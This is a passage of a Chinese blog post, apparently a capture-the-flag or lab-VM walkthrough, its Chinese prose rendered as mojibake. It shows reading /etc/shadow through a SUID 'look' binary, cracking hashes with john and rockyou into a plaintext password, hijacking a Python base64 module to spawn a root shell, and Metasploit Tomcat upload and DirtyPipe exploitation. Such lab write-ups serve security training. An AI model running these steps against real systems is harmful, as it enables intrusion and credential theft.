src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848242089-b16d2c47-3abe-4290-a029-dfb464358552.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848253798-06b751ac-015c-4380-af43-529e6c93a457.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848596168-2fc1bbc6-8597-475a-9ea9-485327445731.png\" /></p>\n<p>æŸ¥çœ‹user.txtå¾—åˆ°ç¬¬ä¸€ä¸ªflag</p>\n<p>homeç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼ŒåŠ ä¸Šä¹‹å‰readme.txtå‡ºæ¥çš„çŒœæµ‹å¯èƒ½æœ‰ä¸¤ä¸ªç”¨æˆ·ï¼Œjayeå’Œrandy</p>\n<p>ä¹‹å‰æ‰«æç«¯å£çš„æ—¶å€™å‘ç°22ç«¯å£å¼€æ”¾<a target=\"_blank\">é“¾æ¥</a></p>\n<p>åˆ©ç”¨ä¹‹å‰å‹ç¼©åŒ…æ–‡ä»¶ä¸­å¾—åˆ°çš„å¯†ç sshä¸€ä¸‹è¿™ä¸¤ä¸ªè´¦æˆ·ï¼Œjayeç™»å½•æˆåŠŸ</p>\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848497149-7dbcf576-9ce7-47c2-852e-40492d925636.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848619500-c4b7c805-350c-41dc-b6ca-4d7fd3351d35.png\" /></p>\n<p>ç™»å½•è¿›æ¥ä¹‹åæŸ¥æ‰¾èƒ½åˆ©ç”¨çš„ä¸œè¥¿ï¼Œå…ˆçœ‹çœ‹æœ‰äº›å•¥ï¼Œï¼Œ<br />\n<img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849098656-118fa5a4-a6ac-44bc-91d1-0a5c3d6de862.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849163723-f3c0f89f-1b83-41a5-9171-857cecff071c.png\" /></p>\n<p>æ‰¾åˆ°ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶lookï¼Œæ˜¯ç³»ç»Ÿçš„look</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849251300-4e6e6ffc-3fed-42e4-aa90-4edeaea62133.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849316970-058bd5f2-6df7-43e5-a15b-f20304385091.png\" /></p>\n<p>lookå¯ä»¥è¶Šæƒè®¿é—®ï¼ŒæŸ¥çœ‹/etc/shadow</p>\n<p><code>look</code>è¶Šæƒå‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼š<a href=\"https://gtfobins.github.io/gtfobins/look/\" rel=\"noopener nofollow\" target=\"_blank\">https://gtfobins.github.io/gtfobins/look/</a></p>\n<pre><code class=\"language-shell\">LFILE=file_to_read\n./look '' \"$LFILE\"\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852700836-c03d0b5f-941e-4693-ad5b-915f40692179.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852711349-e7d362bb-b5fa-40ab-8ded-a88731ffad65.png\" /></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">æŠŠ /etc/shadow æ–‡ä»¶å’Œpasswdæ–‡ä»¶å¤åˆ¶ä¸‹æ¥,ï¼Œä¿å­˜åˆ°æœ¬åœ°ã€‚/etc/passwd æ–‡ä»¶å¯ä»¥åœ¨msfæ§åˆ¶å°è·å–ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸Šè¿°æ–¹å¼è·å–ï¼Œä½¿ç”¨ unshadow å‘½ä»¤ç”Ÿæˆéœ€è¦ç ´è§£çš„å¯†ç ,æˆ‘ä»¬åªç”¨çˆ†ç ´rootçš„å’Œrandå°±è¡Œäº†ï¼š</font></p>\n<pre><code class=\"language-shell\">unshadow passwd ushadow &gt; pass.txt\n</code></pre>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">ç”¨johnç ´è§£ä¸€ä¸‹,ï¼š</font></p>\n<pre><code class=\"language-shell\">john --wordlist=/usr/share/wordlists/rockyou.txt shadow\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767856185003-928062a7-c19a-41ae-8f39-75caa0ca1217.png\" /></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">çˆ†ç ´å¾—åˆ°ï¼šrandy:07051986randy</font></p>\n<p>ç™»å½•<font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">randy</font></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">åœ¨æ ¹ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªpythonå¯æ‰§è¡Œ è„šæœ¬</font></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767857029281-ef4ba5b6-d896-4cd3-a25b-7cb5f4d57a4c.png\" /></p>\n<h2 id=\"23ææƒ-æ–‡ä»¶\">2.3ææƒ-æ–‡ä»¶</h2>\n<p>çœ‹ä¸€ä¸‹æƒé™ï¼Œå‘ç°è¿™ä¸ªpythonæ–‡ä»¶ä¸èƒ½ä¿®æ”¹</p>\n<p>çœ‹çœ‹å¯ä»¥å¹²ä¸€äº›ä»€ä¹ˆ</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858343998-deb9e511-fc73-4e88-a2c9-a1e0adcc4385.png\" /></p>\n<p>ä½†æ˜¯åœ¨ä»£ç ä¸­å¼•å…¥äº†ä¸€ä¸ªbase64æ¨¡å—</p>\n<p>çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶åœ¨python3.8ç›®å½•ä¸‹</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858240847-acdc523c-4639-488c-9e46-8e4de021ae4b.png\" /></p>\n<p>æŸ¥çœ‹ä¸€ä¸‹æƒé™</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858360245-61c74e0b-e0d3-4491-9ae3-0011ca29dd54.png\" /></p>\n<p>å¯ä»¥ç¼–è¾‘ï¼Œå†™å…¥shell</p>\n<pre><code class=\"language-python\">import os\n\nos.system(\"/bin/bash\")\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860492323-7b06b3b3-5d88-45fc-b1c2-c856b3be623b.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858778389-d04b98f1-7d28-48e9-a155-a9476a5c0690.png\" /></p>\n<p>æ‰§è¡Œè„šæœ¬</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860567499-1dd3e58b-77b6-4435-869d-bc7ed67797bb.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860580515-e2ea5737-c24a-40f1-a295-a7a12e457739.png\" /></p>\n<h2 id=\"24ææƒ-å†…æ ¸æ¼æ´\">2.4ææƒ-å†…æ ¸æ¼æ´</h2>\n<p>å¯ç”¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬å†…æ ¸æ¼æ´ææƒ</p>\n<p>msfæ¼æ´åˆ©ç”¨</p>\n<pre><code class=\"language-python\">search tomcat upload\nuse 7\noptions\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768397978392-13dde72c-191d-41c4-8872-1c7753ceb9d8.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398030818-436e42b8-0a3a-45b5-9a25-b2c9a42c9868.png\" /></p>\n<p>è®¾ç½®å‚æ•°å¼€å§‹åˆ©ç”¨</p>\n<pre><code class=\"language-python\">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhosts 192.168.222.135\nrhosts =&gt; 192.168.222.135\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080\nrport =&gt; 8080\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername admin\nHttpUsername =&gt; admin\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai\nHttpPassword =&gt; melehifokivai\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; options\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; run\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398081653-71bade4e-c0d2-45a8-9c30-5e1a059f7a3c.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398170110-9c526eeb-edb1-41c0-b5b9-316eff262666.png\" /></p>\n<p>åå°è¿è¡Œ session</p>\n<p>å‡çº§ Java Meterpreter â†’ åŸç”Ÿ Linux Meterpreter</p>\n<pre><code class=\"language-plain\">background\nsessions -u 1\n</code></pre>\n<p>æŠŠ session 1ï¼ˆJava Meterpreterï¼‰å‡çº§æˆçœŸæ­£çš„ <strong>Linux x86 Meterpreter</strong>ï¼ˆsession 2ï¼‰</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398401444-52a916e1-31f3-44d7-aa84-a6092074f627.png\" /></p>\n<p>æŸ¥çœ‹</p>\n<pre><code class=\"language-plain\">sessions l\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398485753-8ed545b3-d3ca-4770-aa59-a76e1ecddf98.png\" /></p>\n<p>æŸ¥çœ‹ DirtyPipe ææƒæ¨¡å— ï¼Œæ ¹æ®Linux å†…æ ¸ç‰ˆæœ¬æˆ‘ä»¬å°è¯•åˆ©ç”¨çš„æ˜¯cve-2022-0847</p>\n<pre><code class=\"language-plain\">search cve-2022-0847\nuse exploit/linux/local/cve_2022_0847_dirtypipeæˆ–è€…use 0\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398537111-cb27b496-d3ff-414a-a7f6-fb46f493a3ca.png\" /></p>\n<p>è®¾ç½®å‚æ•°</p>\n<pre><code class=\"language-plain\">set session 2 #è®¾ç½®ä½¿ç”¨çš„ä¼šè¯\nset lhost 192.168.222.137 #è®¾ç½®æ¥æ”¶çš„IP\nrun\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398723499-a7fa7fcb-9658-4edb-8ef7-a2a7da7c498d.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398752106-102483b7-6610-4e75-87e6-d27b586c26fb.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398839025-bc36ab9e-6a92-4a08-b340-4c3d2b4e0262.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 15:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/yuell\">æœ‰ä¸€å¤§ç›’</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">47</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    }
  ]
}